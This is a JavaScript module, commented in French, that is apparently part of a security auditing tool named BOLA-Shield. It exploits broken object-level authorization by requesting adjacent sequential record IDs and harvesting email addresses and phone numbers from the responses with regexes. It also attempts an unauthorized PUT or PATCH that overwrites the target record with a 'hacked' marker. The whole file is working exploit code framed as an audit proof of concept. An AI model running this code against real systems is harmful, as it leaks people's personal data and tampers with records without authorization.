/* ======================================================================
   BOLA-Shield — Data Exfiltration & Sabotage Engine
   Module d'exploitation avancée BOLA (Data Leak, Attack Chaining).
   S'active uniquement lorsque BOLA est confirmé sur une ressource.
   ====================================================================== */

export async function runExfiltrationAndSabotage(page, targetBase, vulnerableEndpoint, objectId, broadcastEvent, executeFetchInPage) {
    const exfiltrationDump = {
        scannedIds: [],
        extractedPII: { emails: [], phones: [] },
        sabotageStatus: null
    };

    broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[EXFILTRATION] BOLA confirmée. Démarrage du Proof-of-Concept d'aspiration de données...` });

    try {
        // 1. Data Mining : Extraction d'informations sur la cible initiale
        const initialRes = await executeFetchInPage(page, vulnerableEndpoint, 'GET');
        if (initialRes && initialRes.ok && initialRes.data) {
            extractSensitiveData(initialRes.data, exfiltrationDump.extractedPII);
        }

        // 2. Échantillonnage de Masse (Mass Data Leak Simulation)
        // Ne fonctionne que si l'ID est incrémentiel (numérique) ou s'il s'agit d'une URL simple
        const numericId = parseInt(objectId, 10);
        if (!isNaN(numericId) && numericId > 0) {
            broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[EXFILTRATION] ID séquentiel détecté. Test de 3 IDs adjacents...` });
            for (let i = 1; i <= 3; i++) {
                const adjacentId = numericId + i;
                const adjacentEndpoint = vulnerableEndpoint.replace(objectId, adjacentId.toString());
                
                const res = await executeFetchInPage(page, adjacentEndpoint, 'GET');
                if (res && res.ok) {
                    exfiltrationDump.scannedIds.push(adjacentId);
                    if (res.data) extractSensitiveData(res.data, exfiltrationDump.extractedPII);
                }
                // Pause pour ne pas saturer le réseau
                await new Promise(r => setTimeout(r, 500));
            }
        } else {
             broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[EXFILTRATION] ID non-séquentiel (UUID). Aspiration de masse ignorée.` });
        }

        if (exfiltrationDump.extractedPII.emails.length > 0 || exfiltrationDump.extractedPII.phones.length > 0) {
            broadcastEvent({ origin: 'AUDIT', type: 'error', msg: `[EXFILTRATION CRITIQUE] ${exfiltrationDump.extractedPII.emails.length} emails et ${exfiltrationDump.extractedPII.phones.length} numéros de téléphone aspirés !` });
        }

        // 3. Attack Chaining (Simulation de Sabotage / Data Modification)
        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[SABOTAGE] Simulation de modification (Attack Chaining) sur la ressource initiale...` });
        
        const payload = JSON.stringify({ bola_shield_poc: "hacked", _poc_status: "BOLA-Shield Attack Chaining Test" });
        
        // On tente un PUT puis un PATCH si nécessaire
        let sabRes = await executeFetchInPage(page, vulnerableEndpoint, 'PUT', payload);
        if (sabRes && sabRes.status === 405) {
            sabRes = await executeFetchInPage(page, vulnerableEndpoint, 'PATCH', payload);
        }

        exfiltrationDump.sabotageStatus = sabRes ? sabRes.status : 'failed';

        if (sabRes && sabRes.status >= 200 && sabRes.status < 300) {
            broadcastEvent({ origin: 'AUDIT', type: 'error', msg: `[SABOTAGE RÉUSSI] Le serveur a accepté une modification (Code ${sabRes.status}) de la cible par un utilisateur non-autorisé !` });
        } else {
             broadcastEvent({ origin: 'AUDIT', type: 'success', msg: `[SABOTAGE BLOQUÉ] Le serveur a refusé la modification (Code ${sabRes ? sabRes.status : 'N/A'}). Protégé contre l'altération de données.` });
        }

    } catch (e) {
        broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[EXFILTRATION] Erreur du module POC : ${e.message}` });
    }

    return exfiltrationDump;
}

/**
 * Parcourt un objet JSON pour trouver des e-mails et des numéros de téléphone via Regex
 */
function extractSensitiveData(obj, piiStorage) {
    if (!obj) return;
    const strObj = typeof obj === 'string' ? obj : JSON.stringify(obj);

    // Extraction basique des emails
    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const emails = strObj.match(emailRegex);
    if (emails) {
        emails.forEach(e => {
            if (!piiStorage.emails.includes(e)) piiStorage.emails.push(e);
        });
    }

    // Extraction basique de numéros de téléphone (ex: +237 6XX XX XX XX, ou 655443322)
    // Très simplifié pour l'exemple
    const phoneRegex = /(?:\+?237|00237)?\s?[62]\d{2}\s?\d{2}\s?\d{2}\s?\d{2}/g;
    const phones = strObj.match(phoneRegex);
    if (phones) {
        phones.forEach(p => {
             if (!piiStorage.phones.includes(p)) piiStorage.phones.push(p);
        });
    }
}
